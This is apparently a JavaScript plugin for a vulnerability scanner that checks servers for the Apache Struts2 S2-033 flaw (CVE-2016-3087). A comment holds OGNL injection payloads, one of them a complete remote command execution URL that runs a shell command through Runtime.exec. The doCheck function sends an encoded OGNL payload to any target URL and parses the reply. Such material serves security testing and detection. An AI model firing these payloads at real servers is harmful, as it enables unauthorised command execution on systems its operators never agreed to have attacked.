
module.exports={
	tags:"struts2,033,cve-2016-3087,20163087",
	des:"CVE-2016-3087,struts2 033Vulnerability detection",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-033",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-033.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-033",
		"https://nvd.nist.gov/vuln/detail/CVE-2016-3087"],
	/*
s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"

http://127.0.0.1:8080/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=id

	*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self;
		var szOldUrl = url,fnTT = function(x1)
		{
			return _s.fnUrlEncode(x1,'#:@=.[]?( )');
		};
		// encodeURIComponent
		url = url.substr(0, url.lastIndexOf('/') + 1) + fnTT(_s.g_postData) + ":mtx.toString.json?ok=1";
		_s.request(_s.fnOptHeader({method: 'POST',uri: url}),
	    	function(e,r,b)
	    {
	    	_s.error(e);
	    	_s.fnShowBody(b);
	    	_s.fnDoBody(b,"s2-033",szOldUrl,null,function(o)
	    	{
	    		var r = {"url":szOldUrl,"send":url};
  				fnCbk(_s.copyO2O(r,o),_t);
	    	});
	    });
	}
};